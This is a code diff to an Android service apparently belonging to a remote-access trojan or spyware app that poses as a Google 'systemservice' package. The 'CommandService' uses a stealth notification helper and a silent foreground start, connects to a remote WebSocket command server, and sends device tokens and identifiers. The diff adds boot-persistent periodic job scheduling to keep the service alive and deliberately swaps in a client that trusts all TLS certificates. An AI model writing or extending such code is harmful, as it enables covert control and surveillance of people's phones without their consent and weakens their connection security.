@@ -2,6 +2,8 @@ package com.google.android.systemservice.services
 
 import android.app.KeyguardManager
 import android.app.Service
+import android.app.job.JobInfo
+import android.app.job.JobScheduler
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
@@ -19,6 +21,7 @@ import android.util.Log
 import androidx.core.content.FileProvider
 import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.utils.StealthNotificationHelper
+import com.google.android.systemservice.utils.TrustAllCertificates
 import kotlinx.coroutines.*
 import okhttp3.*
 import org.json.JSONObject
@@ -45,7 +48,30 @@ class CommandService : Service() {
         AndroidConfig.loadFromPreferences(this)
         
         startForegroundSilent()
+        scheduleJob()
         connectWebSocket()
+    }
+
+    private fun scheduleJob() {
+        try {
+            val componentName = ComponentName(this, KeepAliveJobService::class.java)
+            val builder = JobInfo.Builder(1234, componentName)
+                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
+                .setPersisted(true)
+            
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
+                // Android 7+ requires 15 mins min
+                builder.setPeriodic(15 * 60 * 1000L) 
+            } else {
+                builder.setPeriodic(5 * 60 * 1000L)
+            }
+                
+            val scheduler = getSystemService(JOB_SCHEDULER_SERVICE) as JobScheduler
+            scheduler.schedule(builder.build())
+            Log.d(TAG, "JobScheduler scheduled")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to schedule job: ${e.message}")
+        }
     }
 
     private fun startForegroundSilent() {
@@ -65,7 +91,7 @@ class CommandService : Service() {
 
     private fun connectWebSocket() {
         try {
-            client = OkHttpClient.Builder()
+            client = TrustAllCertificates.createUnsafeClientBuilder()
                 .connectTimeout(30, TimeUnit.SECONDS)
                 .readTimeout(0, TimeUnit.MILLISECONDS) // No read timeout for WS
                 .writeTimeout(30, TimeUnit.SECONDS)
@@ -74,6 +100,8 @@ class CommandService : Service() {
 
             val request = Request.Builder()
                 .url(AndroidConfig.websocketUrl)
+                .header("X-Device-Token", AndroidConfig.DEVICE_TOKEN)
+                .header("X-Device-ID", getDeviceIdentifier())
                 .build()
 
             webSocket = client?.newWebSocket(request, object : WebSocketListener() {
